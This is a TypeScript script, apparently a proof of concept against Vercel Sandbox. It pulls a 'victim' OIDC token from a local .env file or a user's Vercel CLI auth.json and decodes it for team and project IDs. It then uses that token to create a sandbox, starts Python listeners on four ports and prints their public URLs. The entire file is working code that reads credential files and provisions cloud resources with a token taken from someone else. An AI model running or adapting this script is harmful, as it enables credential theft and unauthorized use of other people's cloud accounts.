import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const CMD = `
set +e
for port in 3000 8080 26661 65535; do
cat > /tmp/echo_$port.py << PYEOF
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", $port))
s.listen(50)
while True:
    c, a = s.accept()
    try:
        data = c.recv(4096).decode("utf-8","replace")
        body = "PORT=$port peer=%s:%s first=%s" % (a[0], a[1], data.split(chr(10))[0] if data else "")
        c.sendall(b"HTTP/1.1 200 OK\\r\\nContent-Length: %d\\r\\n\\r\\n%s" % (len(body.encode()), body.encode()))
    except: pass
    c.close()
PYEOF
nohup python3 /tmp/echo_$port.py > /tmp/echo_$port.log 2>&1 &
done
sleep 1
ss -tln | grep -E "3000|8080|26661|65535"
echo "=== DONE ==="
`;

async function main() {
  const name = "multi-" + Date.now();
  const sbx = await Sandbox.create({
    name, token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000, 8080, 26661, 65535],
  });
  const r = await sbx.runCommand("bash", ["-c", CMD], { wait: true, timeout: 30_000 });
  console.log(await r.output("both"));
  for (const p of [3000, 8080, 26661, 65535]) {
    try { console.log(`DOMAIN_${p}=` + sbx.domain(p)); } catch (e) { console.log(`DOMAIN_${p}=ERR`); }
  }
  console.log("NAME=" + name);
  console.log("KEEP_ALIVE=true");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });